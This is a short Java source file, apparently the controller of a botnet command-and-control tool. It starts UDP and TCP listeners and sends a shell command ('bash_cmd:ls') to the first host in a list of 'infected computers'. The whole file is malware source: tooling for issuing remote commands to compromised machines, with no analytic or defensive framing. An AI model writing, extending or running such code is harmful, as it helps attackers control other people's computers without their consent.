package controller;

import java.io.IOException;
import java.util.ArrayList;

import communication.TCPServer;
import communication.UDP;

public class Controller {
	static ArrayList<Thread> Threads = new ArrayList<>();
	static UDP udpSocket;

	public static void main(String[] args) throws IOException, InterruptedException {
		start();
		udpSocket.sendUDP("bash_cmd:ls", Database.getInfectedComputers().get(0).getKey(),
				Database.getInfectedComputers().get(0).getValue());
		for (Thread thr : Threads) {
			thr.join();
		}
		return;
	}

	public static void start() throws IOException, InterruptedException {
		udpSocket= new UDP();
		Threads.add(new Thread(udpSocket));
		Threads.add(new Thread(new TCPServer(8080)));

		for (Thread thr : Threads) {
			thr.start();
		}
		return;
	}
}
